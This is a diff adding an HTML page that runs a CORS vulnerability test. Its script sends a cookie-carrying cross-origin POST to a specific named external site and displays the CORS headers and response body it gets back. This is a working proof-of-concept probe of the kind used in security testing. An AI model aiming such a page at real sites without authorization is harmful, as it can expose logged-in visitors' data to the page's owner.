@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CORS Vulnerability Test</title>
+<style>
+  body{font-family:Arial,sans-serif;margin:2rem;}
+  pre{background:#f4f4f4;padding:1rem;border-radius:4px;}
+</style>
+</head>
+<body>
+<h2>CORS Vulnerability Test</h2>
+<p>Open the browser console to see the request/response details.</p>
+
+<script>
+(async () => {
+  const TARGET = 'https://sjcetpalai.etlab.in/cdn-cgi/rum?';
+  const ORIGIN = window.location.origin;   // this page’s domain
+
+  try {
+    const res = await fetch(TARGET, {
+      method: 'POST',
+      credentials: 'include',                 // send cookies if any
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ test: 'value', time: new Date().toISOString() })
+    });
+
+    // Read the response body
+    const bodyText = await res.text();
+
+    // Log headers that matter for CORS
+    const corsHeaders = ['Access-Control-Allow-Origin', 'Access-Control-Allow-Methods',
+                         'Access-Control-Allow-Credentials', 'Access-Control-Allow-Headers'];
+    const headerInfo = corsHeaders.reduce((acc, name) => {
+      const val = res.headers.get(name);
+      if (val) acc[name] = val;
+      return acc;
+    }, {});
+
+    // Print everything to the console
+    console.log('--- CORS Test Result ---');
+    console.log('Status:', res.status, res.statusText);
+    console.log('Headers:', headerInfo);
+    console.log('Body:', bodyText);
+
+    // Also show in the page (optional)
+    const output = document.createElement('pre');
+    output.textContent = JSON.stringify({
+      status: res.status,
+      headers: headerInfo,
+      body: bodyText
+    }, null, 2);
+    document.body.appendChild(output);
+
+  } catch (err) {
+    console.error('Error during fetch:', err);
+  }
+})();
+</script>
+</body>
+</html>
